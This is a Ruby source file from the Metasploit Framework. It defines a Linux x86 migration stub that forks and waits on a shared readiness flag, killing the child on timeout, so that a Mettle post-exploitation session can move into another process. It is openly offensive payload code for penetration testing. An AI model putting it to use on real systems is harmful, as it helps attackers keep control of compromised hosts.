# -*- coding: binary -*-
# frozen_string_literal: true

module Msf
  # Payload that supports migration on x86.
  module Payload::Linux::X86::Migrate
    def initialize(info = {})
      super(
        update_info(
          info,
          'Name' => 'Linux Migration (x86)',
          'Description' => 'Migration stub x86',
          'Author' => ['Rapid7'],
          'License' => MSF_LICENSE,
          'Platform' => 'linux',
          'Arch' => ARCH_X86
        )
      )
    end

    #
    # Constructs the migrate stub on the fly.
    #
    def generate(opts = {})
      # eax - payload address
      # ebx - pid of the current Mettle process
      # ecx - file descriptor of the current transport
      # edx - address of a shared child-readiness word
      asm = %(
      push eax
      push ecx
      push ebx
      push edx
      mov ebp, edx
      mov eax, 2
      int 0x80                 ; fork()
      test eax, eax
      jz migrate_child
      js migrate_failed_result

      mov edi, eax             ; child pid
      mov esi, 3000            ; 30 seconds at 10 ms per iteration
    migrate_wait:
      cmp dword [ebp], 1
      je migrate_ready
      cmp dword [ebp], 0
      jne migrate_failed_parent
      sub esp, 8
      mov dword [esp], 0
      mov dword [esp + 4], 10000000
      mov ebx, esp
      xor ecx, ecx
      mov eax, 162             ; nanosleep({ 0, 10000000 }, NULL)
      int 0x80
      add esp, 8
      dec esi
      jnz migrate_wait

    migrate_failed_parent:
      cmp dword [ebp], 0
      jne migrate_failed_result
      test edi, edi
      jle migrate_failed_result
      mov ebx, edi
      mov ecx, 9
      mov eax, 37              ; kill(child, SIGKILL)
      int 0x80
    migrate_failed_result:
      mov eax, dword [ebp]
      int 3                    ; report failure and restore the target

    migrate_ready:
      mov eax, 1
      int 3                    ; report success and restore the target

    migrate_child:
      #{generate_migrate(opts)}
    )

      Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
    end
  end
end
